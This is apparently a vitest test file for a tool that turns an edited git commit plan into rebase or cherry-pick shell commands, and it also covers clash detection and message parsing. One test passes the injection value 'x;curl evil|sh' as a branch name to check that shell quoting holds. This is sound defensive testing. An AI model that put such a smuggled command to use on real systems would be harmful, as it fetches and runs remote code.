import { describe, expect, it } from "vitest";
import type { PlanRow } from "./block";
import {
  delimiter,
  draftShas,
  foldTarget,
  insertRow,
  isEdited,
  messageText,
  move,
  parseMessage,
  paste,
  reorderClashes,
  reset,
  setAction,
  setText,
  shq,
  verdict,
  warnings,
  type PlanBlock,
} from "./plan";

const T = "2026-08-29T09:00:00Z";
const SHA = (c: string) => c.repeat(40);

function row(c: string, idx: number, subject: string, files: string[], extra: Partial<PlanRow> = {}): PlanRow {
  return {
    sha: SHA(c),
    parents: [],
    subject,
    author: "chris",
    date: T,
    refs: [],
    idx,
    message: `${subject}\n\nbody of ${c}`,
    files,
    clash: [],
    action: "pick",
    ...extra,
  };
}

// newest first, like the log: c is the tip, a the oldest
const rows = (): PlanRow[] => [
  row("c", 0, "fix typo", ["src/auth.rs"]),
  row("b", 1, "add auth", ["src/auth.rs", "README.md"]),
  row("a", 2, "wip", ["notes.txt"]),
];

const block = (rows: PlanRow[], extra: Partial<PlanBlock> = {}): PlanBlock => ({
  kind: "plan",
  mode: "rebase",
  base: { sha: SHA("0"), ref: "main" },
  head: "feat/auth",
  rows,
  footer: [],
  ...extra,
});

describe("paste", () => {
  it("writes a rebase plan as heredocs and a hands-free rebase", () => {
    let r = rows();
    r = setAction(r, 0, "fixup"); // fix typo folds into add auth
    r = setText(r, 1, "add auth with session cookies\n\nwhy: the old flow leaked");
    r = setAction(r, 2, "drop");
    expect(paste(block(r))).toEqual([
      "git switch 'feat/auth'",
      "cat > /tmp/wd-0000000-msg-1 <<'EOF'",
      "add auth with session cookies\n\nwhy: the old flow leaked",
      "EOF",
      "cat > /tmp/wd-0000000-todo <<'EOF'",
      `drop ${SHA("a")} wip`,
      `pick ${SHA("b")} add auth`,
      `fixup ${SHA("c")} fix typo`,
      "exec git commit --amend -F /tmp/wd-0000000-msg-1",
      "EOF",
      `GIT_SEQUENCE_EDITOR='cp /tmp/wd-0000000-todo' git rebase -i ${SHA("0")}`,
    ]);
    expect(warnings(block(r))).toEqual([]);
  });

  it("keeps the raw verbs when no message is drafted, and notes a headless branch", () => {
    let r = rows();
    r = setAction(r, 0, "squash");
    r = setAction(r, 1, "reword");
    r = setAction(r, 2, "edit");
    const lines = paste(block(r, { head: undefined }));
    expect(lines[0]).toBe("# check out the branch that holds these commits first");
    expect(lines.slice(1, 6)).toEqual([
      "cat > /tmp/wd-0000000-todo <<'EOF'",
      `edit ${SHA("a")} wip`,
      `reword ${SHA("b")} add auth`,
      `squash ${SHA("c")} fix typo`,
      "EOF",
    ]);
  });

  it("turns a reword with text into pick plus an amend", () => {
    const r = setText(rows(), 2, "first steps");
    expect(r[2].action).toBe("reword");
    const lines = paste(block(r));
    expect(lines).toContain(`pick ${SHA("a")} wip`);
    expect(lines).toContain("exec git commit --amend -F /tmp/wd-0000000-msg-1");
    expect(lines.filter((l) => l.startsWith("cat >"))).toHaveLength(2);
  });

  it("guards a message that contains the delimiter", () => {
    expect(delimiter(["EOF"])).toBe("EOF1");
    expect(delimiter(["a\n  EOF1\nb", "EOF"])).toBe("EOF2");
    const r = setText(rows(), 0, "EOF");
    const lines = paste(block(r));
    expect(lines).toContain("cat > /tmp/wd-0000000-msg-1 <<'EOF1'");
    expect(lines.filter((l) => l === "EOF1")).toHaveLength(2);
  });

  it("keeps a fold with nothing before it as a pick and says so", () => {
    let r = rows();
    r = setAction(r, 2, "squash");
    expect(warnings(block(r))).toEqual(["row 3 has nothing to squash into; kept as pick"]);
    expect(paste(block(r))).toContain(`pick ${SHA("a")} wip`);
    // a drop before it does not count as a target either
    r = setAction(rows(), 2, "drop");
    r = setAction(r, 1, "fixup");
    expect(warnings(block(r))).toEqual(["row 2 has nothing to fixup into; kept as pick"]);
  });

  it("skips drops between a fold and its target", () => {
    let r = rows();
    r = setAction(r, 1, "drop");
    r = setAction(r, 0, "fixup"); // folds into wip, past the drop
    r = setText(r, 2, "wip, typo fixed");
    const lines = paste(block(r));
    expect(lines).toEqual(
      expect.arrayContaining([
        `pick ${SHA("a")} wip`,
        `drop ${SHA("b")} add auth`,
        `fixup ${SHA("c")} fix typo`,
        "exec git commit --amend -F /tmp/wd-0000000-msg-1",
      ])
    );
    expect(lines.indexOf(`drop ${SHA("b")} add auth`)).toBeLessThan(
      lines.indexOf(`fixup ${SHA("c")} fix typo`)
    );
  });

  it("shell-quotes branch names so a hostile ref cannot break out", () => {
    expect(shq("feat/auth")).toBe("'feat/auth'");
    expect(shq("a'b")).toBe("'a'\\''b'");
    // a rebase onto a branch whose name is a shell injection
    const evil = block(rows(), { head: "x;curl evil|sh" });
    const line = paste(evil).find((l) => l.startsWith("git switch"))!;
    expect(line).toBe("git switch 'x;curl evil|sh'");
    // a cherry-pick onto the same
    const pk = paste(block(rows(), { mode: "pick", onto: "x;curl evil|sh", head: undefined }));
    expect(pk[0]).toBe("git switch 'x;curl evil|sh'");
  });

  it("writes a cherry-pick plan oldest first, dropped rows left out", () => {
    const r = setAction(rows(), 1, "drop");
    const b = block(r, { mode: "pick", onto: "release/1.x", head: undefined });
    expect(paste(b)).toEqual([
      "git switch 'release/1.x'",
      `git cherry-pick -x ${SHA("a")} ${SHA("c")}`,
    ]);
    const none = block(r.map((x) => ({ ...x, action: "drop" as const })), { mode: "pick", onto: "main" });
    expect(paste(none)).toEqual([]);
    expect(warnings(none)).toEqual(["every row is dropped; nothing to pick"]);
  });
});

describe("editing", () => {
  it("knows whether reset would change anything", () => {
    expect(isEdited(rows())).toBe(false);
    expect(isEdited(setAction(rows(), 0, "drop"))).toBe(true);
    expect(isEdited(setText(rows(), 0, "x"))).toBe(true);
    expect(isEdited(move(rows(), 2, 0))).toBe(true);
    // a drag-in appended and left as a pick has nothing to restore
    const appended = insertRow(rows(), row("d", 9, "new", []), 3);
    expect(isEdited(appended)).toBe(false);
    // but reorder it and reset has work to do
    expect(isEdited(move(appended, 3, 0))).toBe(true);
  });

  it("moves rows and resets to the original order", () => {
    const moved = move(rows(), 2, 0);
    expect(moved.map((r) => r.sha[0])).toEqual(["a", "c", "b"]);
    expect(move(rows(), 0, 0)).toEqual(rows());
    expect(move(rows(), 0, 9)).toEqual(rows());
    const edited = setText(setAction(moved, 1, "fixup"), 2, "changed");
    expect(reset(edited)).toEqual(rows());
  });

  it("inserts a dropped row with a fresh idx, once", () => {
    const d = row("d", 9, "from elsewhere", ["src/auth.rs"], { action: "drop", text: "x" });
    const r = insertRow(rows(), d, 1);
    expect(r.map((x) => x.sha[0])).toEqual(["c", "d", "b", "a"]);
    expect([r[1].idx, r[1].action, r[1].text]).toEqual([3, "pick", undefined]);
    expect(insertRow(r, d, 0)).toBe(r);
    expect(insertRow(rows(), d, 99).map((x) => x.sha[0])).toEqual(["c", "b", "a", "d"]);
    // it counts as moved past everything it sits above that shares a file
    expect(reorderClashes(r).get(1)).toBe("reordered past row 3 (src/auth.rs)");
  });

  it("flips pick to reword with a new text and back with the original", () => {
    let r = setText(rows(), 0, "fix the typo");
    expect(r[0].action).toBe("reword");
    expect(r[0].text).toBe("fix the typo");
    r = setText(r, 0, "fix typo\n\nbody of c");
    expect(r[0].action).toBe("pick");
    expect(r[0].text).toBeUndefined();
    // pick forgets the text, drop keeps it; a fold never uses its own
    r = setText(rows(), 0, "x");
    expect(setAction(r, 0, "drop")[0].text).toBe("x");
    expect(setAction(r, 0, "pick")[0].text).toBeUndefined();
    expect(setAction(r, 0, "squash")[0].text).toBeUndefined();
    // a trailing newline (the start of a body) is kept as typed but is
    // not a change: the row stays a pick and the todo has no amend
    r = setText(rows(), 0, "fix typo\n\nbody of c\n");
    expect(r[0].action).toBe("pick");
    expect(r[0].text).toBe("fix typo\n\nbody of c\n");
    expect(paste(block(r))).not.toContain(`exec git commit --amend -F /tmp/wd-${"0".repeat(7)}-msg-1`);
  });

  it("finds the rows a draft should read and where a fold lands", () => {
    let r = rows();
    r = setAction(r, 0, "fixup");
    r = setAction(r, 1, "drop");
    expect(draftShas(r, 2)).toEqual([SHA("a"), SHA("c")]);
    expect(draftShas(r, 0)).toEqual([SHA("c")]);
    expect(foldTarget(r, 0)).toBe(2);
    expect(foldTarget(r, 2)).toBeNull();
  });
});

describe("clashes", () => {
  it("marks rows moved past another that touches the same file", () => {
    // wip (notes.txt) moved to the top: no shared file, nothing to say
    expect(reorderClashes(move(rows(), 2, 0)).size).toBe(0);
    // add auth moved above fix typo: both touch src/auth.rs
    const moved = move(rows(), 1, 0);
    expect([...reorderClashes(moved)]).toEqual([
      [0, "reordered past row 2 (src/auth.rs)"],
      [1, "reordered past row 1 (src/auth.rs)"],
    ]);
    // a dropped row is out of the picture
    expect(reorderClashes(setAction(moved, 1, "drop")).size).toBe(0);
  });

  it("gives a verdict from target clashes and reorders", () => {
    expect(verdict(block(rows()))).toEqual({
      text: "likely clean (no file overlap with the target)",
      warn: false,
    });
    const r = rows();
    r[1] = { ...r[1], clash: ["README.md"] };
    expect(verdict(block(r))).toEqual({
      text: "1 row touches files also changed on main since the base; expect conflicts",
      warn: true,
    });
    expect(verdict(block(move(r, 1, 0), { mode: "pick", onto: "rel" })).text).toBe(
      "2 rows touch files also changed on rel; expect conflicts"
    );
  });
});

describe("parseMessage", () => {
  it("reads subject and body sections", () => {
    expect(parseMessage("subject\nadd auth with cookies.\n\nbody\nwhy: the old flow leaked\nand more\n")).toEqual({
      subject: "add auth with cookies",
      body: "why: the old flow leaked\nand more",
    });
    expect(parseMessage("subject\n\nfix typo\n")).toEqual({ subject: "fix typo", body: "" });
    expect(parseMessage("just a line\nsecond")).toEqual({ subject: "just a line", body: "" });
    expect(messageText({ subject: "s", body: "b" })).toBe("s\n\nb");
    expect(messageText({ subject: "s", body: "" })).toBe("s");
  });
});
